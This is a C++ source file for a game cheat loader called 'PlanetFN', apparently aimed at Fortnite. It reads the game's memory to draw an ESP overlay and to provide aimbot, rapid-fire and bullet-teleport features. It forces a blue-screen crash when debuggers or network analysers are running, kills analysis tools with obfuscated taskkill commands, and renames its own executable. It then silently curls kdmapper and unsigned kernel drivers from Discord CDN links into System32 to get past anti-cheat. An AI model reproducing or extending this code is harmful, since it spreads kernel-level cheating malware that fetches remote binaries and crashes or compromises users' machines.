#include "win_utils.h"
#include "d3d9_x.h"
#include "xor.hpp"
#include <dwmapi.h>
#include <vector>
#include "godfather.h"
#include "skStr.h"
#include <string>
#include <iostream>
#include "skStr.h"
#include "Controller.h"
#include <Windows.h>
#include <string>
#include <fstream>
#include "offsets.h"
#include <cstdint>
#include <filesystem>
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>
#include <random>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <random>
#include <msxml.h>    
#include <atomic>
#include <mutex>
#include <Windows.h>
#include <TlHelp32.h>
#include <cstdint>
#include <vector>
#include <random>
#include <memoryapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string_view>
#include <mutex>
#include <chrono>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <vector>
#include <math.h>
#include <windows.h>
#include <Lmcons.h>
#include "Keybind.h"
#include <vector>
#include <random>
#include <functional> //for std::function
#include <algorithm>  //for std::generate_n
#include "lazy.h"
#include "anti_dbg.h"
#include "anti_dump.h"
#include "FVector.h"
#include "driver.h"

bool bullettp = false;
bool showStats = false;
bool presets = false;
DWORD_PTR closestPawnbullet = NULL;

static std::string ReadGetNameFromFName(int key) {
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xDFE4740 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
	uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

	int nameLength = nameEntry >> 6;
	char buff[1024];
	if ((uint32_t)nameLength)
	{
		for (int x = 0; x < nameLength; ++x)
		{
			buff[x] = read<char>(NamePoolChunk + 4 + x);
		}

		char* v2 = buff;
		signed int v4 = nameLength;
		int v5;
		uint64_t result;
		unsigned int v7; // ecx
		char v8; // dl
		uint64_t v9; // rcx
		uint16_t* v10; // rax

		v5 = 0;
		result = read<unsigned int>(base_address + 0xDECFFC8) >> 5;

		if (v4)
		{
			do
			{
				v7 = *v2++;
				v8 = result ^ (16 * v7) ^ (result ^ (v7 >> 4)) & 0xF;
				result = (unsigned int)(result + 4 * v5++);
				*(v2 - 1) = v8;
			} while (v5 < v4);
		}
		buff[nameLength] = '\0';
		return std::string(buff);
	}
	else {
		return "";
	}
}

static std::string GetNameFromFName(int key)
{
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xDFE4740 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset); //((ChunkOffset + 2) * 8) ERROR_NAME_SIZE_EXCEEDED
	if (read<uint16_t>(NamePoolChunk) < 64)
	{
		auto a1 = read<DWORD>(NamePoolChunk + 4);
		return ReadGetNameFromFName(a1);
	}
	else
	{
		return ReadGetNameFromFName(key);
	}
}
bool ShowMenu = false;
bool Esp = true;
bool Esp_box = true;
bool Esp_fbox = false;
bool Esp_Distance = false;
bool while_rotating = false;
static int increased_value;
static bool Esp_Skeleton = true;
static bool carFly = false;
static bool backround = false;
float rapidFireVaule = 10;
static bool playerFly = false;
bool Esp_line = true;
static bool Aimbot = true;
bool memoryaim = false;
bool debug = false;
static bool fovCircle = true;
float bA1mb0tSm00th1ngV4lue = 3;
static bool AimWhileJumping = false;
static bool NoEquipAnim = false;
static bool RapidFire = false;
static bool AirStuck = false;
static bool InstaRes = false;
static bool FovChanger = false;
static bool spinbot = false;
static bool doublePump = false;
bool instaReboot = false;
bool ThreeDBox = false;
bool IsBulletTeleporting{ false };
bool ammoESP = false;
bool reloadCheck = false;
bool NoBloom = false;
bool crossHair = false;
static bool silent = false;
bool noreload = false;
//bool playerName = true;
bool targetlines = false;
bool Safemode = true;
bool fpsCounter = true;
ImFont* m_pFont;
bool HealthRegen = false;

static int VisDist = 300;
int AimFOV = 100;
float FOVChangerValue = 100;
static int aimDist = 200;
static int aimkey;
static int hitbox;
static int aimkeypos = 3;
static int hitboxpos = 0;

float speedVlaue = 10;
float FOVChangerValueX;
float FOVChangerValueY;
float FOVChangerValueZ;
float BoxWidthValue = 0.550;

DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR PlayerCamManager;

Vector3 localactorpos;

uint64_t TargetPawn;
int localplayerID;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

DWORD ScreenCenterX;
DWORD ScreenCenterY;

int CurrentActorId;


extern "C"
{
	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
	NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
}

bool BSOD()
{
	BOOLEAN bluescr;
	ULONG cevap;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bluescr);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &cevap);
	return 0;
}


void kill_process()
{
	system(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
}

static void xCreateWindow();
static void xInitD3d();
void DrawESP();
static void xMainLoop();
static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);



static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

 

FTransform GetBoneIndex(DWORD_PTR mesh, int index)
{
	DWORD_PTR bonearray;
	bonearray = read<DWORD_PTR>(mesh + 0x590);

	if (bonearray == NULL)
	{
		bonearray = read<DWORD_PTR>(mesh + 0x5a0 + 0x10);  //(mesh + 0x5e8) + 0x5a));
	}
	return read<FTransform>(bonearray + (index * 0x60));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}


struct Camera
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

//Camera Function

Camera GetCamera(uintptr_t LocalPlayer, uintptr_t LocalRoot, uintptr_t World)
{
	Camera LocalCamera;
	__int64 tmp = read<__int64>(read<__int64>(LocalPlayer + 0xd0) + 0x10);
	LocalCamera.FieldOfView = 80.f / (read<double>(tmp + 0x680) / 1.19f);
	LocalCamera.Rotation.x = read<double>(tmp + 0x7D0);
	LocalCamera.Rotation.y = read<double>(LocalRoot + 0x148);
	LocalCamera.Rotation.x = (asin(LocalCamera.Rotation.x)) * (180.0 / M_PI);
	if (LocalCamera.Rotation.y < 0.0)
		LocalCamera.Rotation.y += 360.0;
	LocalCamera.Location = read<Vector3>(read<uint64_t>(World + 0x100));
	return LocalCamera;
}

struct CamewaDescwipsion
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

CamewaDescwipsion UndetectedCamera(__int64 a1)
{
	CamewaDescwipsion VirtualCamera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(Localplayer + 0xD0);
	__int64 v9 = read<__int64>(v1 + 0x10);

	VirtualCamera.FieldOfView = 80.f / (float)((float)read<double>(v9 + 0x680) / 1.19f);

	VirtualCamera.Rotation.x = read<double>(v9 + 0x7D0);
	VirtualCamera.Rotation.y = read<double>(a1 + 0x148);

	v6 = read<__int64>(Localplayer + 0x70);
	v7 = read<__int64>(v6 + 0x98);
	v8 = read<__int64>(v7 + 0xF8);

	VirtualCamera.Location = read<Vector3>(v8 + 0x20);
	return VirtualCamera;
}




Vector3 ProjectWorldToScreen(Vector3 WorldLocation)
{
	Camera vCamera = GetCamera(PlayerController, PlayerCamManager, Rootcomp);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	float ScreenCenterX = Width / 2;
	float ScreenCenterY = Height / 2;
	float ScreenCenterZ = Height / 2;

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	return Vector3((ScreenCenterX / 2.0f) + vTransformed.x * (((ScreenCenterX / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (ScreenCenterY / 2.0f) - vTransformed.y * (((ScreenCenterY / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}
/*
* Vector3 ProjectWorldToScreen(Vector3 WorldLocation)
{
	CamewaDescwipsion vCamera = UndetectedCamera(Rootcomp);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
	
}
*/

void DrawStrokeText(int x, int y, const char* str)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);

	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x - 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x + 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(255, 255, 255, 255)), utf_8_2.c_str());
}
std::wstring MBytesToWString(const char* lpcszString)
{
	int len = strlen(lpcszString);
	int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, NULL, 0);
	wchar_t* pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1) * sizeof(wchar_t));
	::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, (LPWSTR)pUnicode, unicodeLen);
	std::wstring wString = (wchar_t*)pUnicode;
	delete[] pUnicode;
	return wString;
}
std::string WStringToUTF8(const wchar_t* lpwcszWString)
{
	char* pElementText;
	int iTextLen = ::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, NULL, 0, NULL, NULL);
	pElementText = new char[iTextLen + 1];
	memset((void*)pElementText, 0, (iTextLen + 1) * sizeof(char));
	::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, pElementText, iTextLen, NULL, NULL);
	std::string strReturn(pElementText);
	delete[] pElementText;
	return strReturn;
}
void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), text.c_str());
}
float DrawOutlinedText(ImFont* pFont, const std::string& text, const ImVec2& pos, float size, ImU32 color, bool center)
{
	std::stringstream stream(text);
	std::string line;

	float y = 0.0f;
	int i = 0;

	while (std::getline(stream, line))
	{
		ImVec2 textSize = pFont->CalcTextSizeA(size, FLT_MAX, 0.0f, line.c_str());

		if (center)
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x - textSize.x / 2.0f, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}
		else
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}

		y = pos.y + textSize.y * (i + 1);
		i++;
	}
	return y;
}

void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);
}

void DrawCircle(int x, int y, int radius, RGBA* color, int segments, float thickness)
{
	ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), segments, thickness);
}

void DrawBox(float X, float Y, float W, float H, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRect(ImVec2(X + 1, Y + 1), ImVec2(((X + W) - 1), ((Y + H) - 1)), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)));
	ImGui::GetOverlayDrawList()->AddRect(ImVec2(X, Y), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)));
}

void DrawCorneredBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	//black outlines
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);

	//corners
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

void DrawCrossHair()
{
	ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(ScreenCenterX, ScreenCenterY), 5, ImColor(255, 255, 255, 255));
}

void DrawFilledRect(int x, int y, int w, int h, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), 0, 0);
}

void DrawLeftProgressBar(int x, int y, int w, int h, int thick, int m_health)
{
	int G = (255 * m_health / 100);
	int R = 255 - G;
	RGBA healthcol = { R, G, 0, 255 };

	DrawFilledRect(x - (w / 2) - 3, y, thick, (h)*m_health / 100, &healthcol);
}
void DrawRightProgressBar(int x, int y, int w, int h, int thick, int m_health)
{
	int G = (255 * m_health / 100);
	int R = 255 - G;
	RGBA healthcol = { R, G, 0, 255 };

	DrawFilledRect(x + (w / 2) - 25, y, thick, (h)*m_health / 100, &healthcol);
}

typedef struct _FNlEntity
{
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;

std::vector<FNlEntity> entityList;

std::uintptr_t process_find(const std::string& name)
{
	const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof proc_entry;

	auto found_process = false;
	if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
		do {
			if (name == proc_entry.szExeFile) {
				found_process = true;
				break;
			}
		} while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
	}

	LI_FN(CloseHandle).safe()(snap);
	return found_process
		? proc_entry.th32ProcessID
		: 0;
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}

using namespace std;

std::string random_string(std::string::size_type length)
{
	static auto& chrs = "0123456789"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#%^&*()";

	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

	std::string s;

	s.reserve(length);

	while (length--)
		s += chrs[pick(rg)];

	return s + ".exe";
}


std::string path()
{
	char shitter[_MAX_PATH]; // defining the path
	GetModuleFileNameA(NULL, shitter, _MAX_PATH); // getting the path
	return std::string(shitter); //returning the path
}

int main(int argc, const char* argv[])
{

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	if (process_find(_xor_("KsDumperClient.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("HTTPDebuggerUI.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("HTTPDebuggerSvc.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("FolderChangesView.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("ProcessHacker.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("procmon.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("idaq.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("idaq64.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("Wireshark.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("Fiddler.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("Xenos64.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("Cheat Engine.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("HTTP Debugger Windows Service (32 bit).exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("KsDumper.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("x64dbg.exe")))
	{
		BSOD();
	}
	else if (process_find(_xor_("ProcessHacker.exe")))
	{
		BSOD();
	}
	else if (FindWindow(0, _xor_("IDA: Quick start").c_str()))
	{
		BSOD();
	}

	else if (FindWindow(0, _xor_("Memory Viewer").c_str()))
	{
		BSOD();
	}
	else if (FindWindow(0, _xor_("Process List").c_str()))
	{
		BSOD();
	}
	else if (FindWindow(0, _xor_("KsDumper").c_str()))
	{
		BSOD();
	}
	else if (FindWindow(0, _xor_("HTTP Debugger").c_str()))
	{
		BSOD();
	}
	else if (FindWindow(0, _xor_("OllyDbg").c_str()))
	{
		BSOD();
	}


	std::thread(hidethread).detach();
	std::thread(remotepresent).detach();
	std::thread(contextthread).detach();
	std::thread(debugstring).detach();
	std::thread(kill_process).detach();

	std::rename(path().c_str(), random_string(15).c_str());
	SetConsoleTitleA(random_string(30).c_str());
	auto start = std::chrono::system_clock::now();
	// Some computation here
	auto end = std::chrono::system_clock::now();

	std::chrono::duration<double> elapsed_seconds = end - start;
	std::time_t end_time = std::chrono::system_clock::to_time_t(end);

	SetConsoleTextAttribute(hConsole, 11);
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	if (GetUserName((TCHAR*)name, &size))
		std::cout <<  "[PlanetFN Loading] " << "Hello " << name << "\n";

	Sleep(5000);

	system("start https://discord.gg/MUN7czEyQS");

	std::cout << "[PlanetFN Loading] " << "Loading Drivers...\n";
	Sleep(500);
	std::cout << "[PlanetFN Loading] " << "Waiting For Drivers...";
	Sleep(1500);

	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\cheetoDriver2.sys >nul 2>&1").c_str());
